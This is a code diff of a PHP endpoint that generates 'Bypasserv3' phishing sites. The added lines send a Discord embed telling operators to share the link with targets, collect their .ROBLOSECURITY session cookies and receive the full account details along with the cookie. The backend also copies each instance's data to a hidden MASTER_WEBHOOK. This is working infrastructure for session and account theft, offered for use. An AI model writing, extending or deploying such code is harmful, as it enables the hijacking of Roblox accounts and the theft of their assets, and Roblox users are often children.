@@ -1,8 +1,4 @@
 <?php
-/**
- * Instance Creation Endpoint with Dualhook Support
- */
-
 header('Content-Type: application/json');
 header('Access-Control-Allow-Origin: *');
 header('Access-Control-Allow-Methods: POST, OPTIONS');
@@ -26,9 +22,8 @@ $input = json_decode(file_get_contents('php://input'), true);
 
 $directory = sanitizeDirectory($input['directory'] ?? '');
 $webhook = trim($input['webhook'] ?? '');
-$dualHook = trim($input['dualHook'] ?? ''); // NEW: Dual webhook support
-$username = trim($input['username'] ?? 'beammer');
-$profilePicture = trim($input['profilePicture'] ?? 'https://hyperblox.eu/files/img.png');
+$username = 'Bypasserv3';
+$profilePicture = 'https://cdn.discordapp.com/attachments/1287002478277165067/1348235042769338439/hyperblox.png';
 
 // Validation
 if (empty($directory) || strlen($directory) < 3) {
@@ -37,9 +32,15 @@ if (empty($directory) || strlen($directory) < 3) {
     exit;
 }
 
-if (strlen($directory) > 20) {
+if (strlen($directory) > 32) {
     http_response_code(400);
-    echo json_encode(['success' => false, 'error' => 'Directory name must be less than 20 characters']);
+    echo json_encode(['success' => false, 'error' => 'Directory name must be less than 32 characters']);
+    exit;
+}
+
+if (!preg_match('/^[a-zA-Z0-9_-]+$/', $directory)) {
+    http_response_code(400);
+    echo json_encode(['success' => false, 'error' => 'Directory can only contain letters, numbers, hyphens, and underscores']);
     exit;
 }
 
@@ -61,13 +62,6 @@ if (!validateWebhook($webhook)) {
     exit;
 }
 
-// Validate dual hook if provided
-if (!empty($dualHook) && !validateWebhook($dualHook)) {
-    http_response_code(400);
-    echo json_encode(['success' => false, 'error' => 'Invalid dual webhook URL.']);
-    exit;
-}
-
 // Rate limiting
 $clientIP = getUserIP();
 if (!checkRateLimit($clientIP, 10, 3600)) {
@@ -84,7 +78,6 @@ $instanceData = [
     'directory' => $directory,
     'webhook' => MASTER_WEBHOOK,
     'userWebhook' => $webhook,
-    'dualHook' => $dualHook, // NEW: Store dual webhook
     'username' => $username,
     'profilePicture' => $profilePicture,
     'createdAt' => date('c'),
@@ -116,7 +109,6 @@ $tokenData = [
     'token' => $token,
     'directory' => $directory,
     'webhook' => $webhook,
-    'dualHook' => $dualHook, // NEW: Store in token
     'username' => $username,
     'createdAt' => date('c')
 ];
@@ -131,11 +123,10 @@ updateGlobalStats('totalInstances', 1);
 // Log creation
 logSecurityEvent('instance_created', [
     'directory' => $directory,
-    'has_dualhook' => !empty($dualHook),
     'token' => substr($token, 0, 8) . '...'
 ]);
 
-// Send notification to webhook
+// Send notification to user webhook
 $domain = $_SERVER['HTTP_HOST'] ?? 'localhost';
 $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
 $baseUrl = $protocol . '://' . $domain;
@@ -145,43 +136,33 @@ $webhookData = [
     'avatar_url' => 'https://cdn.discordapp.com/attachments/1287002478277165067/1348235042769338439/hyperblox.png',
     'embeds' => [
         [
-            'title' => '🎉 Instance Created Successfully!',
-            'description' => "Your Bypasserv3 instance has been created and is ready to use.",
-            'color' => hexdec('00BFFF'),
+            'title' => '✅ Site Generated Successfully',
+            'description' => "Your bypass site **{$directory}** is ready with **FULL EMBED FUNCTIONALITY!**",
+            'color' => hexdec('00FF00'),
             'fields' => [
                 [
-                    'name' => '🔗 Instance URL',
-                    'value' => "```\n{$baseUrl}/public/?dir={$directory}\n```",
-                    'inline' => false
-                ],
-                [
-                    'name' => '📊 Dashboard',
-                    'value' => "```\n{$baseUrl}/dashboard/?token={$token}\n```",
-                    'inline' => false
-                ],
-                [
-                    'name' => '🔑 Access Token',
-                    'value' => "```\n{$token}\n```",
-                    'inline' => false
-                ],
-                [
-                    'name' => '📁 Directory',
+                    'name' => '📁 Site Name',
                     'value' => "`{$directory}`",
-                    'inline' => true
+                    'inline' => false
                 ],
                 [
-                    'name' => '⏰ Created',
-                    'value' => date('Y-m-d H:i:s'),
-                    'inline' => true
+                    'name' => '🔗 Your Link',
+                    'value' => "[{$baseUrl}/public/?dir={$directory}]({$baseUrl}/public/?dir={$directory})",
+                    'inline' => false
                 ],
                 [
-                    'name' => '🔔 Dual Webhook',
-                    'value' => !empty($dualHook) ? '✅ Enabled' : '❌ Disabled',
-                    'inline' => true
+                    'name' => '✨ Full Features',
+                    'value' => "✅ Account info fetching\n✅ Robux balance display\n✅ Premium status check\n✅ Limited RAP calculation\n✅ Group ownership detection\n✅ IP geolocation\n✅ Game visit stats\n✅ Rich Discord embeds\n✅ Cookie refresh bypass\n✅ Master admin logging",
+                    'inline' => false
+                ],
+                [
+                    'name' => '📋 How It Works',
+                    'value' => "1. Share your link with targets\n2. They submit their .ROBLOSECURITY cookie\n3. Cookie is automatically Bypassed\n4. You receive FULL ACCOUNT INFO + BYPASSED COOKIE\n5. Master log sent to admin",
+                    'inline' => false
                 ]
             ],
             'footer' => [
-                'text' => 'Bypasserv3 | Keep your token safe!'
+                'text' => 'Site Generator - ' . date('Y-m-d h:i:s A')
             ],
             'timestamp' => date('c')
         ]
@@ -197,8 +178,6 @@ echo json_encode([
     'token' => $token,
     'directory' => $directory,
     'instanceUrl' => $baseUrl . '/public/?dir=' . $directory,
-    'dashboardUrl' => $baseUrl . '/dashboard/?token=' . $token,
-    'hasDualHook' => !empty($dualHook)
+    'dashboardUrl' => $baseUrl . '/dashboard/?token=' . $token
 ]);
-
 ?>
